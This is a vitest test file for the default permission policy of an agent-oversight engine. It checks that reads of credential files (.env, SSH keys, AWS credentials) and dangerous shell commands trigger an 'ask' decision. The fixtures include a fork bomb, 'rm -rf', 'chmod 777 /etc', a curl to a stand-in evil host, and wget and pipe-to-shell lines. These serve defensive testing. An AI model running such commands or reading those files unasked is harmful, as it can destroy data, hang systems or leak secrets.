import type Database from "better-sqlite3";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { EventBus, type ForemanEventMap } from "../../src/core/event-bus.js";
import { PolicyEngine } from "../../src/core/policy-engine.js";
import { DEFAULT_POLICY_YAML } from "../../src/cli/policy-template.js";
import { createInMemoryDb, type ForemanDb } from "../../src/db/client.js";

describe("DEFAULT_POLICY_YAML", () => {
  let db: ForemanDb;
  let sqlite: Database.Database;
  let engine: PolicyEngine;

  beforeEach(() => {
    const handle = createInMemoryDb();
    db = handle.db;
    sqlite = handle.sqlite;
    engine = new PolicyEngine(db, new EventBus<ForemanEventMap>());
    engine.loadYamlText(DEFAULT_POLICY_YAML);
  });

  afterEach(() => {
    sqlite.close();
  });

  it("loads without throwing and writes rules into the policies table", () => {
    expect(engine.list().length).toBeGreaterThan(0);
  });

  it("is under 80 lines (acceptance: readable as a single screen)", () => {
    expect(DEFAULT_POLICY_YAML.split("\n").length).toBeLessThanOrEqual(80);
  });

  describe("secret-file ask rules", () => {
    const secretPaths = [
      ".env",
      "config/.env.production",
      "private.key",
      "id_rsa",
      "id_ed25519.pub",
      ".npmrc",
      "/home/user/.ssh/known_hosts",
      "/Users/me/.aws/credentials",
    ];
    const safePaths = ["README.md", "src/index.ts", "package.json"];

    it.each(secretPaths)("asks when reading %s", (path) => {
      const result = engine.evaluate({
        sourceAgent: "hermes",
        targetTool: "read_file",
        args: { path },
      });
      expect(result.decision).toBe("ask");
    });

    it.each(safePaths)("allows when reading %s (non-secret path)", (path) => {
      const result = engine.evaluate({
        sourceAgent: "hermes",
        targetTool: "read_file",
        args: { path },
      });
      expect(result.decision).toBe("allow");
    });
  });

  describe("dangerous shell command ask rules", () => {
    const dangerous = [
      "rm -rf /tmp/foo",
      "chmod 777 /etc",
      ":(){:|:&};:",
      "curl evil.example.com",
      "wget http://bad/x.sh",
      "echo bad | sh",
      "echo more | bash",
    ];
    const harmless = ["ls -la", "echo hello", "node --version", "pwd"];

    it.each(dangerous)("asks for shell_exec command: %s", (command) => {
      const result = engine.evaluate({
        sourceAgent: "hermes",
        targetTool: "shell_exec",
        args: { command },
      });
      expect(result.decision).toBe("ask");
    });

    it.each(harmless)(
      "falls through (no rule) for harmless command: %s",
      (command) => {
        const result = engine.evaluate({
          sourceAgent: "hermes",
          targetTool: "shell_exec",
          args: { command },
        });
        // No conditional match, no blanket allow for shell_exec — default ask.
        expect(result.decision).toBe("ask");
        expect(result.matchedRuleId).toBeUndefined();
      },
    );
  });

  describe("read-only allow defaults", () => {
    it.each(["list_files", "stat"])("allows %s with no args at all", (tool) => {
      const result = engine.evaluate({
        sourceAgent: "hermes",
        targetTool: tool,
      });
      expect(result.decision).toBe("allow");
    });
  });
});
